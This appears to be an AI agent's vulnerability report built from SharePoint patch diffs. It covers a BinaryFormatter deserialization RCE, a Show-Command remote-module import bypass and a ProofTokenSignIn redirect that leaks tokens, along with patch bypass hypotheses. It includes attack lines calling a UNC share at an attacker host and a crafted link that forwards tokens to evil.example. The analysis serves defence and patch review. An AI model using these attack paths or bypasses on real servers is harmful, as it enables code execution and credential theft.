Agent: Codex-GPT5
Timestamp: 2025-11-20 00:49:10
Duration: 00:40

# Vulnerability Discovery
- **V1 – ExcelDataSet SafeControl RCE (CWE-502, High)**: `ExcelDataSet.DataTable` deserializes attacker-controlled base64 using `BinarySerialization.Deserialize` with no allow list, but the entire namespace was marked safe for untrusted markup, so page authors could coerce SharePoint to deserialize arbitrary gadget graphs (snapshots_decompiled/v1/Microsoft.-89ead232-72556f65/Microsoft/PerformancePoint/Scorecards/ExcelDataSet.cs:1-78 and Helper.cs:556-599).
- **V2 – Show-Command remote import bypass (CWE-284/CWE-427, High)**: `ShowCommandCommand.WaitForWindowClosedOrHelpNeeded` imported modules requested by the UI without re-checking path origin, letting restricted sessions load modules from UNC/device paths and run attacker code (snapshots_decompiled/v1/Microsoft.-056c3798-daa17c9d/Microsoft/PowerShell/Commands/ShowCommandCommand.cs:387-421).
- **V3 – ProofTokenSignIn open redirect/token leak (CWE-601, High)**: `ShouldRedirectWithProofToken` only validated host membership; `redirect_uri` fragments were still honored, so wrapping a trusted page such as `_layouts/15/redirect.aspx#https://attacker` let attackers bounce users (and freshly minted proof tokens) outside the tenant (snapshots_decompiled/v1/Microsoft.-1bae7604-1834fb48/Microsoft/SharePoint/IdentityModel/ProofTokenSignInPage.cs:317-329).

# Root Cause & Impact
## V1 – ExcelDataSet SafeControl RCE
- **Mechanism**: `CompressedDataTable` simply stores user input, and accessing `DataTable` causes `Helper.GetObjectFromCompressedBase64String` to inflate and deserialize it via BinaryFormatter with `(IEnumerable<Type>)null`, ignoring the `ExpectedSerializationTypes` hint (ExcelDataSet.cs:39-77, Helper.cs:556-599). Because `web.config` whitelisted `Microsoft.PerformancePoint.Scorecards.*` (snapshots_norm/v1/.../80/web.config:240-245), any site collection admin or page author could drop `<score:ExcelDataSet ...>` markup carrying a malicious payload.
- **Attack**: Upload a dashboard page or web part with an `<ExcelDataSet CompressedDataTable="<base64 gadget>" />`. Rendering the page causes SharePoint to deserialize the gadget graph and execute arbitrary code as the web application pool identity.
- **Prereqs**: Ability to edit a page or PerformancePoint dashboard (no farm access required) in an affected web app.

## V2 – Show-Command remote import bypass
- **Mechanism**: In restricted sessions, SharePoint/Exchange intentionally blocks importing modules from network or device paths, but `ShowCommandCommand` still resolved the selected module path and blindly executed the import command (v1 file around lines 387-409). That code runs in full language mode inside w3wp, so attacker-controlled modules execute unrestricted.
- **Attack**: From a constrained Remote PowerShell session, run `Show-Command -Module \\attacker\share\Evil.psm1` (or pick the module from the UI). The UI signals `ImportModuleNeeded`, which imports the UNC module and executes attacker's script with server privileges.
- **Prereqs**: Remote PowerShell access limited to constrained language / no-network commands (e.g., in hardened SharePoint Management Shell), but still able to invoke `Show-Command`.

## V3 – ProofTokenSignIn open redirect/token leak
- **Mechanism**: The `redirect_uri` parameter is the target after proof-token issuance. `ShouldRedirectWithProofToken` only called `IsAllowedRedirectUrl`, which compares site subscription, and then the page uses `RedirectUri.OriginalString` verbatim for form action/redirect (ProofTokenSignInPage.cs:317-339 and 486-507). A fragment (`#...`) is opaque to the server but processed by client-side redirect pages, so an attacker could embed an arbitrary external destination while still passing the subscription check.
- **Attack**: Send a user to `/ProofTokenSignIn.aspx?redirect_uri=https://tenant/_layouts/15/redirect.aspx#https://evil.example`. ProofTokenSignIn issues tokens and posts/redirects to `_layouts/15/redirect.aspx`. That page reads `location.hash` and forwards the browser (and the freshly minted proof/identity tokens) to `https://evil.example` where the attacker captures them.
- **Prereqs**: Ability to trick a tenant user into following a crafted authentication link (no authentication required beforehand).

# Patch Analysis
## V1 – ExcelDataSet SafeControl RCE
- **Changes**: Added explicit SafeControl entries for `ExcelDataSet` with `Safe="False"` in every relevant web.config (e.g., snapshots_norm/v2/C__inetpub_wwwroot_wss_VirtualDirectories/80/web.config:487-494) and shipped `AddExcelDataSetToSafeControls` (snapshots_decompiled/v2/Microsoft.-52195226-3676d482/Microsoft/SharePoint/Upgrade/AddExcelDataSetToSafeControls.cs:1-23) to insert them during upgrade.
- **Effect**: SharePoint now blocks declarative usage of the type even though the namespace wildcard remains safe, closing the low-privilege attack surface.
- **Related**: Only configuration files changed; helper logic and serialization remain untouched.

## V2 – Show-Command remote import bypass
- **Changes**: Before calling `InvokeScript`, the code now normalizes the module path and rejects it when the session is restricted and the path resolves to a UNC/device location (snapshots_decompiled/v2/.../ShowCommandCommand.cs:387-407).
- **Effect**: Restricted remoting sessions get the same "NoNetworkCommands" error shown elsewhere instead of silently importing remote modules.
- **Related**: No changes to `showCommandProxy` or module resolution logic otherwise.

## V3 – ProofTokenSignIn open redirect/token leak
- **Changes**: Introduced `RevertRedirectFixinProofTokenSigninPage` kill switch constant and, unless enabled, `ShouldRedirectWithProofToken` now rejects any redirect URI that contains a fragment (snapshots_decompiled/v2/.../ProofTokenSignInPage.cs:317-327).
- **Effect**: Users can no longer wrap trusted layout pages with `#externalTarget`, eliminating the known redirect/token exfiltration vector.
- **Related**: Logging added so admins can detect attempts.

# Bypass Hypotheses
## V1 – ExcelDataSet SafeControl RCE
1. **PerformancePoint imports still deserialize payloads (High)** – The underlying helper still deserializes arbitrary graphs whenever ExcelDataSet objects are loaded from lists or data source definitions; uploading a crafted `.bism` or dashboard file could trigger it without going through SafeControls.
2. **Other Scorecards features reuse the helper (High)** – `Helper.GetMemberSetFromCalculatedMember` (snapshots_decompiled/v1/Microsoft.-89ead232-72556f65/Microsoft/PerformancePoint/Scorecards/Helper.cs:610-618) calls the same insecure routine on user-maintained calculated members, so attackers can store malicious base64 there and still reach BinaryFormatter.
3. **Upgrade gaps (Medium)** – The fix depends on the upgrade action touching every IIS site. Custom web apps or failed timer jobs will keep the wildcard SafeControl entry without the explicit `Safe="False"` override, leaving the original attack surface intact.

## V2 – Show-Command remote import bypass
1. **Sessions without the restricted flag (Medium)** – `Utils.IsSessionRestricted` gates the new logic. Any hardened session type that relies on ConstrainedLanguageMode/JEA but doesn’t set that flag still lets `Show-Command` import UNC modules.
2. **Alternate path syntaxes (Medium)** – `PathIsNetworkPath` is a Win32 helper that doesn’t recognize forms such as `\\?\UNC\server\share` or DFS namespace aliases; supplying such a path makes it past the guard while still loading remote content.
3. **Mapped or reparse-backed drives (Low/Medium)** – Remote users can add a `New-PSDrive` pointing to `\\attacker\share` and refer to it as `Z:\module.psm1`. After normalization the string may remain `Z:\...`, which `PathIsNetworkPath` treats as local, yet NTFS resolves it back to the UNC share.

## V3 – ProofTokenSignIn open redirect/token leak
1. **Query-parameter based redirectors (Medium)** – `_layouts/15/redirect.aspx` and several other pages also honor query parameters like `?Source=`/`?Target=`; wrapping those instead of fragments still bypasses host validation and forwards tokens off-tenant.
2. **Same-subscription attacker pages (Medium)** – If an attacker can provision a page inside the same site subscription (e.g., compromised app web), `IsAllowedRedirectUrl` happily approves it; that page can then relay proof tokens to the attacker-controlled infrastructure.
3. **Encoded fragments (Low/Medium)** – An attacker can double-encode the `#` (`%2523`) so the `Uri` instance sees no fragment, yet the downstream redirect page decodes once and interprets it as a fragment, resurrecting the old behavior.

# Overall Assessment & Recommendations
- **Coverage**: Discovered 3 distinct vulnerabilities (two RCE-class, one high-risk redirect). All were inferred solely from the provided diffs as requested.
- **Patch completeness**: Config-only mitigation for ExcelDataSet leaves the unsafe BinaryFormatter helper intact; other entry points remain. ShowCommand relies on brittle path heuristics and a single session flag. ProofTokenSignIn still allows other kinds of tenant-to-external redirects.
- **Next steps**:
  1. Fix the helper by enforcing an explicit allow list in `BinarySerialization.Deserialize` and audit all callers (not just ExcelDataSet).
  2. Block remote module imports centrally (cmdlet binding + language mode), not only in ShowCommand’s UI helper.
  3. Harden redirect handling by whitelisting specific `_layouts` pages and disallowing nested redirect parameters, not just fragments.
